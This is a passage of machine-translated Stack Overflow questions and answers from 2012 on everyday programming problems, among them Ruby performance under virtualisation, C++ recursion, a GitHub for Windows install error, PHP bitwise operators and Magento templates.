> ID：13490187
> 
> 赞同：5
> 
> 时间：2012-11-21T09:35:26.263
> 
> 标签：ruby, performance, vmware, virtualization, kvm

我们切换到新的开发服务器并体验到我们的测试套件需要*两倍的时间*。我们测试了数据库、文件系统等，但这些东西非常快，甚至比以前更快。

因此，我们编写了一个小型 ruby​​ 基准测试（斐波那契）并执行了几次（平均值如下）：

```
time_start = Time.now
f = lambda { |x| x < 2 ? x : f.call(x-1) + f.call(x-2) }
f.call(35)
time = Time.now - time_start

puts "#{time.round(4)}s needed" 
```

使用 XEN 之前的机器：6s

使用 OpenVZ 后的机器：11,5

在两台机器上都安装了 rvm的**Debian Squeeze （-> 编译）** **ruby​​-1.9.3-p194**。这些机器上没有高负载，内存也可以。

或多或少唯一的区别是虚拟化引擎。在生产中，我们使用 VMware ESXi。基准测试需要大约*11 秒*。我们用 KVM 测试了另一台服务器，基准测试需要**2,5s**。

* * *

*   带 XEN 的机器：6s
*   带 OpenVZ 的机器：11.5 秒
*   使用 VMware ESXi 的机器：11 秒
*   KVM机器：2.5s

* * *

那么我们可以在虚拟化中进行哪些更改以使我们的 ruby​​ 更快呢？或者您有其他想法可能是什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:42:12.903

我刚刚在使用 Debian Squeeze 的 ESXi 5 系统和使用 Ubuntu Precise（服务器）的系统上对其进行了测试。在 Squeeze 上必须编译 Ruby-1.9.3-p194 而在 Ubuntu 上不需要。但是两个系统上的结果是相同的：11.x 秒。所以我认为我们也可以忽略内核版本并专注于虚拟化层。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T16:12:37.953

问题是 rvm。现在这个问题解决了！

[https://github.com/wayneeseguin/rvm/issues/1326](https://github.com/wayneeseguin/rvm/issues/1326)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T11:35:20.040

也许@martinseener 正在做某事。你可能想看看这个：
[http ://alisnic.net/blog/making-your-ruby-fly/](http://alisnic.net/blog/making-your-ruby-fly/)

而这个：
[https ://gist.github.com/1688857?utm_source=rubyweekly&utm_medium=email](https://gist.github.com/1688857?utm_source=rubyweekly&utm_medium=email)

基本上 rvm 正在编译没有优化标志的 ruby​​。也许这就是问题所在？然而，我发布的链接通过补丁更深入地提高了速度，但基本修复是在使用 rvm 编译 ruby​​ 时启用优化标志。

这里有一些进一步的讨论：
[http ://www.reddit.com/r/ruby/comments/13mc3s/making_your_ruby_fly/](http://www.reddit.com/r/ruby/comments/13mc3s/making_your_ruby_fly/)

# c++ - 堆栈保留大小和堆栈提交大小的增加会提高应用程序性能吗？

> ID：13490190
> 
> 赞同：0
> 
> 时间：2012-11-21T09:35:33.000
> 
> 标签：c++, windows, stack

我有一个应用程序可以最大限度地利用递归函数。基本上它是一个字符串解析器，它使用哈希映射作为其数据结构。我们正面临一个问题，其中复杂和长字符串的性能受到严重打击。我们不敢碰散列函数，害怕回归。观察到的是大量递归函数调用，我们怀疑这会导致性能问题。该应用程序是基于 VS 2008 开发的 C++(Windows)

堆栈保留大小和堆栈提交大小的增加会提高应用程序性能吗？或者它会避免我们遇到但不经常遇到的内存不足问题吗

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T09:39:51.803

> 堆栈保留大小和堆栈提交大小的增加会提高应用程序性能吗？

几乎可以肯定，它不会对性能产生明显的影响。

> 它会避免我们遇到的内存不足问题吗？

不，如果您用完堆栈空间，那么您会收到堆栈溢出错误而不是内存不足。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T09:54:20.157

堆栈使用本身不会显着影响性能。进行函数调用（恰好是递归调用）的成本可能是哈希函数运行时的重要组成部分，如果是这样，迭代版本可能会更快。

*在 C++ 中最大限度*地使用递归可能效率低下并且也有些危险，因为堆栈大小是有限的。例如，

```
size_t hash(const std::string &s) {
    if (s.size() == 0) return 0;
    return s[0] + 31 * hash(s.substr(1));
} 
```

*由于两个*原因（调用开销和分配字符串负载的可能性），这可能效率低下，并且在传递足够长的字符串时也会因堆栈溢出而崩溃。

> 我们不敢碰散列函数，害怕回归。

即使除了性能之外，散列映射中使用的散列函数也应该被隔离以便于维护——一份代码副本，并且在其他任何地方都没有使用任何特定散列算法的假设。

如果你能隔离散列函数，那你就敢碰它。这样，您可以轻松比较不同的哈希算法和不同的实现（包括递归/非递归），看看它们是否解决了您的整体性能问题。

如果你不能隔离散列函数，那么你就学到了关于代码设计的一课。但是，您可能仍然可以替换它，并在*不*知道代码是否仍然正确的情况下了解它是否会影响性能。如果您可以使其更快，那么值得尝试使其正确（通过修改其余代码以隔离散列函数然后替换它）。如果你能想出的最好的散列函数不是更快，那么它是否正确并不重要，因为没有理由使用它。

# class - NoClassDefFoundError：无法初始化类 org.apache.myfaces.shared.util.StreamCharBuffer

> ID：13490222
> 
> 赞同：0
> 
> 时间：2012-11-21T09:37:25.963
> 
> 标签：class, tomcat, jsf-2, myfaces

我正在 Tomcat 上部署 MyFaces 应用程序，并在请求页面时收到此错误。myfaces-api-2.1.9.jar 和 myfaces-impl.2.1.9.jar 都在我的应用程序的 WEB-INF/lib 文件夹中（我的主机阻止我将它们添加到 server/lib），并且 StreamCharBuffer 在impl jar。从堆栈跟踪（如下所示）很难看出可能导致错误的原因。有人知道问题可能是什么吗？

谢谢，尼尔

```
java.lang.NoClassDefFoundError: Could not initialize class org.apache.myfaces.shared.util.StreamCharBuffer
        at org.apache.myfaces.shared.renderkit.html.HtmlResponseWriterImpl.getInternalBuffer(HtmlResponseWriterImpl.java:983)
        at org.apache.myfaces.shared.renderkit.html.HtmlResponseWriterImpl.closeStartTagIfNecessary(HtmlResponseWriterImpl.java:331)
        at org.apache.myfaces.shared.renderkit.html.HtmlResponseWriterImpl.close(HtmlResponseWriterImpl.java:893)
        at org.apache.myfaces.view.facelets.FaceletViewDeclarationLanguage.renderView(FaceletViewDeclarationLanguage.java:2058)
        at org.apache.myfaces.application.ViewHandlerImpl.renderView(ViewHandlerImpl.java:285)
        at org.apache.myfaces.lifecycle.RenderResponseExecutor.execute(RenderResponseExecutor.java:116)
        at org.apache.myfaces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:241)
        at javax.faces.webapp.FacesServlet.service(FacesServlet.java:199)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:270)
        at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)
        at java.security.AccessController.doPrivileged(Native Method)
        at javax.security.auth.Subject.doAsPrivileged(Subject.java:517)
        at org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:302)
        at org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:163)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:283)
        at org.apache.catalina.core.ApplicationFilterChain.access$000(ApplicationFilterChain.java:56)
        at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:189)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:185)
        at org.springframework.orm.hibernate3.support.OpenSessionInViewFilter.doFilterInternal(OpenSessionInViewFilter.java:198)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:270)
        at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)
        at java.security.AccessController.doPrivileged(Native Method)
        at javax.security.auth.Subject.doAsPrivileged(Subject.java:517)
        at org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:302)
        at org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:243)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:230)
        at org.apache.catalina.core.ApplicationFilterChain.access$000(ApplicationFilterChain.java:56)
        at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:189)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:185)
        at com.encounter.security.Filter.doFilter(Filter.java:78)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:270)
        at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)
        at java.security.AccessController.doPrivileged(Native Method)
        at javax.security.auth.Subject.doAsPrivileged(Subject.java:517)
        at org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:302)
        at org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:243)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:230)
        at org.apache.catalina.core.ApplicationFilterChain.access$000(ApplicationFilterChain.java:56)
        at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:189)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:185)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
        at org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:864)
        at org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:579)
        at org.apache.tomcat.util.net.AprEndpoint$Worker.run(AprEndpoint.java:1665)
        at java.lang.Thread.run(Thread.java:662) 
```

# matlab - Matlab排序字符串日历日期

> ID：13490224
> 
> 赞同：0
> 
> 时间：2012-11-21T09:37:32.483
> 
> 标签：matlab, sorting, calendar, plot, string-comparison

我有以下格式的数据

MovieID、日历周、人气

10006, 52-01, 5
10006, 1-02, 4
10006, 2-02, 9
10006, ....
10006, 52-05 10
.................... .
20032, 14-03, 6
......
20032, 51-05, 9
30023, 34-04, 8
30023, 35-04, 10
...... …………

因此，每部电影都有从不同日历周开始的数据。我想为每部电影绘制关于日历周的人气。我所做的步骤如下： 1- 从上述数据中获取唯一的电影 ID 2- 对于每个唯一的电影 ID，绘制流行度 wrt 长度（日历周）。将所有图都放在一个图形上。这是错误的方法，因为它没有根据正确的日历周进行绘制。其次，我无法在 x 轴上标记 CalendarWeek。

请指导。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:59:58.693

你是如何解析你的数据的？您是否将 CalendarWeek 列作为字符串获取？您是否使用过任何 Matlab 日期函数？因为按照您的描述加载数据只会导致 Matlab 进行减法 52-01 = 51

# c# - 使用 Canvas 作为 ItemsPanelTemplate 和 Binding Canvas.Top 不起作用

> ID：13490225
> 
> 赞同：3
> 
> 时间：2012-11-21T09:37:34.917
> 
> 标签：c#, xaml, data-binding, windows-store-apps, itemcontainerstyle

首先，我正在使用 C# 和 XAML 编写适用于 Windows 8 的 Windows Store 应用程序。我正在使用 a`GridView`来显示对象的分组集合。每个组都显示为一个单独的列，其中显示了相关的项目。

这很好用，但我希望`ItemsPanel`每列的都是一个`Canvas`面板。

```
<GroupStyle.Panel>
    <ItemsPanelTemplate>
        <Canvas />
    </ItemsPanelTemplate>
</GroupStyle.Panel> 
```

现在我`Canvas.Top`在 xaml 中设置了一个静态数字。这像预期的那样工作。

```
<GridView.ItemContainerStyle>
    <Style TargetType="GridViewItem">
        <Setter Property="Canvas.Top" Value="50" />
    </Style>
</GridView.ItemContainerStyle> 
```

但是，如果我使用数据绑定，它就不起作用。

```
<Setter Property="Canvas.Top" Value="{Binding Distance}" /> 
```

绑定不适用于使用 Visual Studio 2012 进行 Windows 8 应用商店应用开发中的样式和设置器？我该如何解决这个问题，我可以从属性中为每个项目动态设置 Canvas.Top？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-04T10:55:07.653

WinRT 不支持样式设置器中的绑定，类似于版本 5 之前的 Silverlight。请参阅[此答案](https://stackoverflow.com/questions/11857505/how-do-i-do-bindings-in-itemcontainerstyle-in-winrt)，该答案也与绑定相关`ItemContainerStyle`（建议使用一些附加属性的解决方法）。

或者，您可以在生成项目容器时在代码中设置属性值/绑定 - 子类化`GridView`并覆盖[ItemsControl.PrepareContainerForItemOverride](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.controls.itemscontrol.preparecontainerforitemoverride.aspx)之类的内容以设置从项目容器到模型项目的绑定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-04T10:31:55.497

似乎将 Styles 中的属性绑定到 ViewModel 不可用。
Canvas.Top 是一种附加属性。
如果要动态更改 的每个项目的属性`Canvas.Top`，[可以在代码隐藏中进行](https://stackoverflow.com/a/11831975/1613961)。
提取每个`GridViewItem`'s`Canvas`然后设置其 Top 属性。

# github - GitHub for Windows 安装

> ID：13490229
> 
> 赞同：27
> 
> 时间：2012-11-21T09:37:47.367
> 
> 标签：github

安装 GitHub for Windows 时，如何解决此错误：

> 尝试下载“ [http://github-windows.s3.amazonaws.com/GitHub.application](http://github-windows.s3.amazonaws.com/GitHub.application) ”时出错。

日志文件：

```
 The following properties have been set:
Property: [AdminUser] = true {boolean}
Property: [InstallMode] = HomeSite {string}
Property: [ProcessorArchitecture] = AMD64 {string}
Property: [VersionNT] = 6.2.0 {version}
Running checks for package 'Windows Installer 3.1', phase BuildList
The following properties have been set for package 'Windows Installer 3.1':
Running checks for command 'WindowsInstaller3_1\WindowsInstaller-KB893803-v2-x86.exe'
Result of running operator 'VersionGreaterThanOrEqualTo' on property 'VersionMsi' and value '3.1': true
Result of checks for command 'WindowsInstaller3_1\WindowsInstaller-KB893803-v2-x86.exe' is 'Bypass'
'Windows Installer 3.1' RunCheck result: No Install Needed
Running checks for package 'Microsoft .NET Framework 4 (x86 and x64)', phase BuildList
Reading value 'Version' of registry key 'HKLM\Software\Microsoft\NET Framework Setup\NDP\v4\Full'
Read string value '4.5.50709'
Setting value '4.5.50709 {string}' for property 'DotNet40Full_TargetVersion'
The following properties have been set for package 'Microsoft .NET Framework 4 (x86 and x64)':
Property: [DotNet40Full_TargetVersion] = 4.5.50709 {string}
Running checks for command 'DotNetFX40\dotNetFx40_Full_x86_x64.exe'
Result of running operator 'ValueEqualTo' on property 'InstallMode' and value 'HomeSite': true
Result of checks for command 'DotNetFX40\dotNetFx40_Full_x86_x64.exe' is 'Bypass'
Running checks for command 'DotNetFX40\dotNetFx40_Full_setup.exe'
Result of running operator 'ValueNotEqualTo' on property 'InstallMode' and value 'HomeSite': false
Result of running operator 'VersionGreaterThanOrEqualTo' on property 'DotNet40Full_TargetVersion' and value '4.0.30129': true
Result of checks for command 'DotNetFX40\dotNetFx40_Full_setup.exe' is 'Bypass'
'Microsoft .NET Framework 4 (x86 and x64)' RunCheck result: No Install Needed
Launching Application.
URLDownloadToCacheFile failed with HRESULT '-2146697208'
Error: An error occurred trying to download 'http://github-windows.s3.amazonaws.com/GitHub.application'. 
```

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2014-03-17T01:04:03.893

您可以使用**Internet Explorer**来`https`代替。即在**Internet Explorer**中打开下面的 URL 。这个对我有用。`http`

 ****```
https://github-windows.s3.amazonaws.com/GitHub.application 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-11-21T10:37:05.797

这可能是 Internet 连接问题，可能是暂时的（重试并查看问题是否仍然存在）。

这就是[该评论所暗示](http://haacked.com/archive/2012/05/21/introducing-github-for-windows.aspx#87324)的。

> 重试后，错误自动解决！

如果问题仍然存在，[此评论](http://haacked.com/archive/2012/05/21/introducing-github-for-windows.aspx#87397)表明：

> 然后您可以尝试直接在 Internet Explorer 中打开 github-windows.s3.amazonaws.com/GitHub.application ，然后它应该可以正常工作。

但是，不建议使用 Internet Explorer（取决于版本，因为它可能不支持[ClickOnce](http://en.wikipedia.org/wiki/ClickOnce)[部署策略](http://msdn.microsoft.com/en-us/library/e2444w33.aspx) （与通常的 Windows Installer 不同）。 最近的 Firefox 或 Chrome 应该允许静默安装 GitHub for Windows。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2013-05-22T17:53:06.097

我有一个类似的问题。我使用 Internet Explorer 进行下载，它工作正常。显然这是我除了下载 Chrome 之外第二次使用 Internet Explorer。感谢 Internet Explorer :P

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-22T07:58:14.103

我遇到了同样的问题。这是由于我的代理设置。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-05-29T14:31:11.353

采用：

```
%SYSTEMROOT%\SYSTEM32\REGSVR32.EXE %SYSTEMROOT%\SYSTEM32\WUAUENG.DLL 
```

运行上述命令确实解决了这个问题。我从 Stack Overflow 问题*[How to fix this error while installed GitHub on Windows 7 64-bit](https://stackoverflow.com/questions/22283381/)*中得到了答案。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-08-30T07:31:10.100

使用本地代理，我的解决方案是将地址从 更改`localhost`为`127.0.0.1`。

出于某种原因，Internet Explorer（和此下载器）无法解析`localhost`，而 Chrome 运行良好。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-08-12T03:43:04.090

这可能会帮助你。这些是我用来解决它的步骤。

`.Window`+`R`或开始 -> 运行。然后写入 (userprofile%\Local Settings\Apps) 或 (%userprofile%\AppData\Local\Apps)。

如果操作系统是 Windows XP，则使用第一个；如果操作系统是 Windows Vista 或 Windows 7，则使用第二个。

然后单击确定。

最后删除 (2.0) 文件夹。

然后再次运行。这个对我有用。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-06-02T09:46:44.553

这很可能是由于互联网速度慢或连接中断。这个下载是通过基本的下载器完成的，即它没有像大多数种子一样暂停和修复服务器断开连接的功能。该软件位于亚马逊服务器上，并且它们的数量有限。在特定日期尝试/尝试从一台计算机下载该软件的次数。当您尝试运行该程序时，它会从亚马逊服务器生成下载请求。如果在特定机器上的尝试次数失败，亚马逊服务器不允许您下载。这个问题的解决方案是等待一段时间，比如几天，然后在稳定的 Internet 连接下尝试相同的过程，它会下载而不会出现任何错误。感谢您阅读答案，

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-06-07T06:02:55.953

错误的主要原因是亚马逊服务器每个系统只分配一个下载。所以一天后尝试。另一件事是使用相同的互联网提供商进行下载。在下载应用程序之前保持打开 github 帐户。这对我有用。

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2016-11-17T04:14:59.840

杀死我的防病毒软件的网络防火墙后，我在 Windows 10 上的安装问题得到了解决。这通常会带来麻烦，限制互联网连接。****

# php - 如何委派给简码函数以过滤当前用户在 Wordpress 中使用 Pods 框架创建的 pod 项目

> ID：13490230
> 
> 赞同：0
> 
> 时间：2012-11-21T09:37:46.723
> 
> 标签：php, wordpress, shortcode, podscms

我想在前端列出一些 pod 项目。为此，我通常使用`pods`简码。为了过滤数据，我`where`在 pod 短代码中使用属性。例如：

```
[pods name="salon" where="author.ID = '2'"]
    <li>{@name}</li>
[/pods] 
```

我想按`author.ID`. 用户应该看到自己创建的 pod 项。可以通过 wordpress api 访问当前用户 `global $current_user;`。也可以通过使用 Pods 的魔法标签来获得它`{@user.ID}`。

但问题是我不能在短代码中使用 php 代码或魔法标签，例如：

```
[pods name="salon" where="author.ID = '{@user.ID}'"] 
```

我正在寻找一种方法来克服这个问题。

我想也许我可以编写一个新的简码函数，我可以在其中获取当前用户的 ID，然后调用`pods`简码函数，如下所示：

```
function pods_by_current_user($atts) {
    $current_user = wp_get_current_user();
    $user_id = $current_user->ID;
    // put it into 'where' attribute and delegate to the "pods" function 
```

你认为这是解决这个问题的正确方法吗？您知道如何将其余部分放入`$user_id`实际的短代码功能`$atts`并将其委托给实际的`pods`短代码功能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T17:22:22.547

在您的 pods_by_current_user 函数中，尝试执行以下操作：

`$atts[ 'where' ] = 'author.ID = ' . (int) $user_id;`

然后返回正常的 Pods 简码：

`return pods_shortcode( $atts );`

这将允许您像往常一样使用任何普通的 [pods] 短代码属性，但会将“位置”设置为自动限制为当前用户 ID。我相信你可以让这更复杂，但这会做你所追求的。

# android - 如何将 Facebook 访问令牌存储在私人服务器中？- 适用于 Android 的 Facebook SDK 3.0

> ID：13490232
> 
> 赞同：0
> 
> 时间：2012-11-21T09:37:52.047
> 
> 标签：android, facebook

我可以使用 Facebook SDK 2.0 在我的 RESTful 服务器上存储访问令牌，因为它具有 Facebook.getAccessToken() 和 Facebook.setAccessToken()。现在我想为我的新应用应用新的 SDK。SDK 3.0 没有 setAccessToken。怎么做？

参考链接：[https ://developers.facebook.com/docs/howtos/androidsdk/3.0/login-with-facebook/#advanced](https://developers.facebook.com/docs/howtos/androidsdk/3.0/login-with-facebook/#advanced)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T19:46:59.553

如果您查看 v3.0.2b，Session 类中有一个新方法可以让您导入访问令牌：

```
openWithImportedAccessToken(String accessToken, Date expirationTime, Date lastRefreshTime, AccessTokenSource accessTokenSource, List permissions, Session.StatusCallback callback) 
```

基于现有 Facebook 访问令牌打开会话。您可以在参考文档中找到更多详细信息：[https ://developers.facebook.com/docs/reference/android/3.0/Session](https://developers.facebook.com/docs/reference/android/3.0/Session)

# javascript - 通过单击确认框中的取消关闭我的父窗口。我希望取消它应该在同一页面上

> ID：13490235
> 
> 赞同：0
> 
> 时间：2012-11-21T09:37:58.627
> 
> 标签：javascript

在确认框中单击取消会关闭我的父窗口。我希望取消它应该留在同一页面上。我为此编写了以下代码。

```
function closeEditorWarning(){
    var r=confirm("This will close all the opened windows of application.Do you want to continue.");
    if (r==true)
    {   
         for (var i=0;i<childWindow.length;i++) {
                if (childWindow[i] && !childWindow[i].closed)
                    childWindow[i].close();
              }
         self.close();
         }
   else
      {
      }
}
window.onbeforeunload = closeEditorWarning; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:45:31.743

你试过删除`self.close();`吗？

编辑：试试这个...

```
window.onbeforeunload = function() {
    closeEditorWarning();
    return null;
} 
```

# php - PHP中的位运算符

> ID：13490240
> 
> 赞同：4
> 
> 时间：2012-11-21T09:38:12.107
> 
> 标签：php, bit-manipulation, operator-keyword

我有以下代码：

```
print "\n1 & 11\n";
var_dump(1 & 11);

print "\n 2 & 222\n";
var_dump(2 & 222); 
```

为什么第一个结果是 1 ？为什么第二个结果是 2？

[PHP 网站](http://php.net/manual/en/language.operators.bitwise.php)说（`2 & 222`例如）应该给我一个布尔值：

> 例如，***$a & $b == true***评估等价然后按位与；while ***($a & $b) == true***先求位，再求等价。”

没看懂，怎么`2 & 222`可能`2`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T09:41:49.170

`&`按位做`AND`。也就是说，它对`AND`输入的所有位进行操作。

二进制：

```
2       = 0000000010
222     = 1011011110
2 & 222 = 0000000010 ( = 2) 
```

不要`&`与`&&`. `&`做`bitwise AND`一会儿`&&`做一个`logical AND`。

```
2 && 222 = true
2 &  222 = 2 
```

至于`1 & 11`

```
1      = 0001
11     = 1011
1 & 11 = 0001 ( = 1) 
```

所以，`1 & 11 = 1`

**进一步阅读：**

[http://en.wikipedia.org/wiki/Binary_and#AND](http://en.wikipedia.org/wiki/Binary_and#AND)

[http://en.wikipedia.org/wiki/AND_gate](http://en.wikipedia.org/wiki/AND_gate)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-21T09:41:51.970

位：

1.  01
2.  10
3.  11

运算符返回两个数字中设置为 1的`&`所有位。所以：

*   1 & 2 -> 01 & 10 -> 00 == 0
*   2 & 3 -> 10 & 11 -> 10 == 2

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:45:30.677

单个＆符号是按位与运算符。
您发布的报价告诉您在进行位运算和比较时应该注意[运算符优先级。](https://en.wikipedia.org/wiki/Operator_precedence)您可能会期望`$a & $b == true`测试是否在 $a 中设置了某些位，但它相当于

$a & (int)($b==true)

由于您没有混合位操作和比较，`var_dump(1&11);`因此`var_dump(2 & 222);`该注释不应该打扰您。
这是一个简单的按位操作，如[https://en.wikipedia.org/wiki/Bitwise_operation#AND中所述](https://en.wikipedia.org/wiki/Bitwise_operation#AND)

see also:
[http://docs.php.net/language.operators.precedence](http://docs.php.net/language.operators.precedence)
[http://docs.php.net/language.types.type-juggling](http://docs.php.net/language.types.type-juggling)

# magento - 从 local.xml magento 中的另一个主题加载模板

> ID：13490241
> 
> 赞同：1
> 
> 时间：2012-11-21T09:38:12.980
> 
> 标签：magento, themes

是否可以从布局文件中加载另一个主题的模板文件？所以而不是像

```
<reference name="head">
    <block type="page/template_links" name="customvars" as="customVars" template="page/html/customvars.phtml"/>
</reference> 
```

一个人可能有：

```
 <reference name="head">
    <block type="page/template_links" name="customvars" as="customVars" template="page/html/customvars.phtml" template="otherTheme" />
</reference> 
```

或者：

```
<reference name="head">
    <block type="page/template_links" name="customvars" as="customVars" template="/app/design/frontend/default/otherTheme/page/html/customvars.phtml"/>
</reference> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:51:18.960

如果您看一下，`Mage_Core_Block_Template::getTemplateFile()`这在标准 Magento 中是不可能的。

```
public function getTemplateFile()
{
    $params = array('_relative'=>true);
    $area = $this->getArea();
    if ($area) {
        $params['_area'] = $area;
    }
    $templateName = Mage::getDesign()->getTemplateFilename($this->getTemplate(), $params);
    return $templateName;
} 
```

您需要的是在代码中设置`$params['_package']`和`$params['_theme']`。作为起点，您可以将此信息存储在块参数中，然后将其复制到`$params`数组中。

但是您可以为产品和类别包指定自定义主题 - 也许这已经有用了？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T19:58:26.197

使用事件观察器可以在渲染指令编译之前注入自定义渲染配置。碰巧，这与控制器操作执行相切，考虑到请求对象的参与，这似乎是合适的。要观察的事件是`controller_action_layout_load_before`，这是观察者逻辑：

```
class Some_Observer
{
    /**
     * Observer to inject update handles via query string.
     *
     *
     * @param Varien_Event_Observer $o
     * @return void
     */
    public function addQueryStringHandle(Varien_Event_Observer $o)
    {
        $update  = $o->getLayout()->getUpdate();
        /* @var $update Mage_Core_Model_Layout_Update */

        $query = $o->getAction()->getRequest()->getQuery();

        if (is_array($query) && count($query)) {
            foreach ($query as $name => $param) {
                if($this->_isValidXmlName($name)) {
                    $update->addHandle('QS_'.$name); // QS_ prefix should prevent collisions
                }
            }
        }
    }

    /**
     * Check validity of arbitrary external string as XML safe
     *
     * @link http://stackoverflow.com/a/2519943/833795
     * @param string $name
     * @return bool
     */
    protected function _isValidXmlName($name)
    {
        try {
            new DOMElement($name);
            return true;
        } catch(DOMException $e) {
            return false;
        }
    }
} 
```

可以通过将以下内容添加到*./index.php*的末尾来检查效果：

```
Zend_Debug::dump(Mage::app()->getLayout()->getUpdate()->getHandles()); 
```

应该测试这个解决方案，尤其是在启用布局缓存的情况下。将某些参数列入白名单甚至可能是谨慎的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-25T09:02:25.267

我正在为任何想要实现这一目标的人添加这个答案。

要从不同的主题加载模板，您只需保持 local.xml 相同（通常的配置），然后在控制器中添加此代码，指定包和主题以用于在以下位置查找模板文件：

```
Mage::getSingleton('core/design_package')
->setPackageName('package')
->setTheme('theme'); 
```

此代码取自 Magento 在使用“自定义设计”时如何为类别页面应用不同的主题。它在我的一个现场网站上进行了测试和工作。

# javascript - 如何在 Facebook 的网页中分享特定图像？

> ID：13490245
> 
> 赞同：0
> 
> 时间：2012-11-21T09:38:27.690
> 
> 标签：javascript, html, facebook, share

Web 应用程序的用户可以选择预览某些图像。当他们单击特定链接时，会打开一个灯箱，其中包含该图像。图像当然会有一个固定的 URL。我希望他们只分享那张特定的照片，而不是整个页面。我怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:16:58.853

您可以使用 JavaScript SDK 并通过调用[FB.ui](https://developers.facebook.com/docs/reference/javascript/FB.ui/)方法使用提要对话框。使用此方法，您可以指定链接、标题、描述等。

附带说明一下，您需要设置一个 facebook 应用程序来使用此方法，但您的用户实际上不必授权该应用程序使用此方法。

# php - jQuery 文件上传 - 配置和运行

> ID：13490247
> 
> 赞同：0
> 
> 时间：2012-11-21T09:38:39.250
> 
> 标签：php, jquery, file-upload

我正在使用这个插件：[jQuery 文件上传](http://blueimp.github.com/jQuery-File-Upload/)

我的 HTML：

```
<input id="fileupload" type="file" name="files[]" data-url="upload.php" multiple>
        <script src="/js/vendor/jquery.ui.widget.js"></script>
        <script src="/js/jquery.iframe-transport.js"></script>
